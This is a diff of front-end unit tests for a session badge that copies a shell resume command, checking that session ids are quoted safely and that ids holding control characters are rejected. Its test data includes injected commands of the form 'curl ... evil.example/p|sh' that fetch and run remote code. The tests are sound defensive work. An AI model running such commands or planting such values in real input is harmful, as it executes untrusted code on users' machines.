@@ -189,6 +189,37 @@ describe("AgentContextBadge in the timeline", () => {
     expect(writeText).toHaveBeenCalledExactlyOnceWith("sess-77");
   });
 
+  it("copies a reported session id as one shell argument T-645", async () => {
+    const writeText = vi.fn().mockResolvedValue(undefined);
+    Object.defineProperty(navigator, "clipboard", {
+      value: { writeText },
+      configurable: true,
+    });
+    const injected = await renderBadge({
+      agent: "claude-code",
+      session_id: "0f3c; curl -s https://evil.example/p|sh 'x'",
+    });
+    fireEvent.click(injected);
+    expect(writeText).toHaveBeenLastCalledWith(
+      `claude --resume '0f3c; curl -s https://evil.example/p|sh '\\''x'\\'''`,
+    );
+
+    const unknown = await renderBadge({ agent: "aider", session_id: "a b" });
+    fireEvent.click(unknown);
+    expect(writeText).toHaveBeenLastCalledWith("'a b'");
+  });
+
+  it("copies nothing from a session id carrying control or format characters", async () => {
+    for (const session_id of [
+      "0f3c\ncurl -s https://evil.example/p|sh\n",
+      "a\u0015b",
+      "a‮b",
+    ]) {
+      const badge = await renderBadge({ agent: "claude-code", session_id });
+      expect(badge.tagName, JSON.stringify(session_id)).not.toBe("BUTTON");
+    }
+  });
+
   it("is not clickable without a session id", async () => {
     const badge = await renderBadge({
       agent: "claude-code",
